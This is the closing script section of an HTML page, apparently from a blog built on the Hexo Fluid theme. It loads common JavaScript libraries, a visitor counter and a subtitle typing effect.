<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
